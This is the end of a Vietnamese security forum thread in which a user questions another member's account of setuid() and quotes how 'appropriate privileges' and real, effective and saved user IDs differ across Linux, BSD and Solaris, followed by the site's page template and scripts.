		</blockquote><br/> Không, làm sao mà "y chang" được. Bạn đọc kỹ lại ví dụ và đoạn trích từ "man bash" của anh conmale, sau đó thực hành thì sẽ thấy nó khác biệt.<br/> <br/> Anh <b>conmale</b>, đoạn này:<br/> <blockquote><br/> 2. nếu người khởi tạo chương trình có real user id (ruid) không phải là 0 (root) thì setuid() không được dùng.<br/> <br/> 3. nếu người khởi tạo chương trình có real user id (ruid) là 0 (root) thì setuid() được dùng. <br/> &nbsp;
		</blockquote><br/> có nhầm lẫn gì không, nếu so với đoạn trên ạ:<br/> <blockquote><br/> Trên Linux (các *nix khác như BSD và System V based có một số ứng dụng tương đồng và dị biệt. Ở đây chúng ta chỉ nói trong phạm vi Linux),<br/> <br/> - nếu euid của người gọi hàm này là root (hoặc privilege user), nói chung có ID là 0, thì cơ chế setuid (gọi hàm setuid()) được ứng hiệu (để ấn định ruid, euid và suid),<br/> <br/> - nếu euid của người gọi hàm này không phải là root (hoặc không phải là privilege user), nói chung là có ID không phải là 0 thì cơ chế setuid (gọi hàm setuid()) không được ứng hiệu. Tuy nhiên, khả năng thực thi cơ chế setuid này vẫn có thể được sử dụng bên ngoài giới hạn uid-setting system calls. <br/> &nbsp;
		</blockquote><br/> <br/> Thêm nữa, điều gì xảy ra trong trường hợp: process không có đặc quyền thích hợp, nhưng <b>uid</b> lại bằng <b>ruid</b> hoặc <b>suid</b>, khi đó <b>setuid()</b> system call sẽ ứng xử thế nào?<br/> <br/> Cụm từ "có đặc quyền thích hợp" - (appropriate privileges) trên mỗi hệ thống (Solaris, BSD, Linux) lại được hiểu khác nhau, xin phép được trích lại:<br/> <blockquote><br/> The phrase "appropriate privileges" varies from platform to platform. For example, on Solaris appropriate privileges for setuid() means that the PRIV_PROC_SETID privilege is in the effective privilege set of the process. On BSD, it means that the effective user ID (EUID) is zero (that is, the process is running as root) or that uid=geteuid(). On Linux, it means that the process has <font color='orange'>CAP_SETUID capability</font> and that setuid(geteuid()) will fail if the effective EUID is not equal to 0, the real user ID (RUID), or the saved set-user-ID (SSUID).<br/> &nbsp;
		</blockquote><br/> <blockquote><br/> What does “appropriate privileges” mean?<br/> • Solaris: EUID=0 (i.e., process is running as root)<br/> • Linux: process has special SETUID capability<br/> —<br/> Note that setuid(geteuid()) will fail if<br/> EUID≠{0,RUID,SSUID}<br/> • BSD: EUID=0 OR newuid=geteuid()<br/> &nbsp;
		</blockquote></span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>

		  <tr>
			<td height="20" colspan="2" valign="bottom" class="rowButton"><span class="gensmall"><font color='orange'>Let's build on a great foundation!</font></span></td>
		  </tr>

			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- quick reply -->
<table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0" align="center">
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left">
			<!-- watch - unwatch -->
			<!-- add bookmark -->

		</td>
		<td align="right" valign="bottom">			
		</td>
	</tr>
</table>

<!-- mod -->

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- combo navigator -->
<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left"><a href="http://digg.com/submit?phrase=2&url=/hvaonline/posts/list/12296.html"><img src="/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=/hvaonline/posts/list/12296.html"><img src="/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=/hvaonline/posts/list/12296.html"><img src="/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=/hvaonline/posts/list/12296.html"><img src="/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=/hvaonline/posts/list/12296.html"><img src="/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=/hvaonline/posts/list/12296.html"><img src="/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=/hvaonline/posts/list/12296.html"><img src="/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
		<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<span class="gensmall">Go to:&nbsp;</span>
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/forums/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Select a forum</option>				
							<option value="0">-------------</option>
									<option value="2" >Thông báo từ HVA</option>
									<option value="41" >FAQ - Các câu hỏi thường gặp</option>
									<option value="5" >Góp ý và Hỏi đáp thắc mắc chung</option>
									<option value="6" >Kiểm tra bảo mật</option>
							<option value="0">-------------</option>
									<option value="8" >Thảo luận bảo mật</option>
									<option value="12" selected="selected">Thảo luận thâm nhập</option>
									<option value="28" >Thảo luận virus, trojan, spyware, worm...</option>
									<option value="36" >Thủ thuật reverse engineering</option>
									<option value="13" >Thông tin new bugs và exploits</option>
									<option value="51" >Case Studies</option>
							<option value="0">-------------</option>
									<option value="23" >Thảo luận hệ điều hành Windows</option>
									<option value="24" >Thảo luận hệ điều hành *nix</option>
									<option value="26" >Thảo luận các loại thiết bị máy tính</option>
									<option value="31" >Thảo luận mạng và thiết bị mạng</option>
									<option value="27" >Thông tin về các địa chỉ và tài liệu hữu ích</option>
							<option value="0">-------------</option>
									<option value="44" >Người tìm việc - Việc tìm người</option>
									<option value="21" >Thảo luận việc định hướng</option>
									<option value="19" >Những thảo luận khác</option>
									<option value="50" >Hình minh họa</option>
									<option value="33" >Trash</option>
							<option value="0">-------------</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- list users in -->
<table class="forumline" cellspacing="3" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<th class="thright"  nowrap="nowrap" height="26" valign="middle">&nbsp;Users currently in here&nbsp;</th>
	</tr>
		<tr>
			<td class="gensmall" valign="middle" align="left">
				1 Anonymous 
				
			</td>	
		</tr>
</table>
<a name="quick"></a>

<table cellspacing="0" cellpadding="0" width="100%" border="0"  align="center">

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.html" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
</table>

<script type="text/javascript" src="/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript" src="/hvaonline/templates/viet/js/avim.js"></script>
<script type="text/javascript">
<!--
function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}




function maxImg(foto, maxSize){
w = foto.width;
if (w > maxSize){
	foto.width = maxSize;
	}
} 

-->
</script>
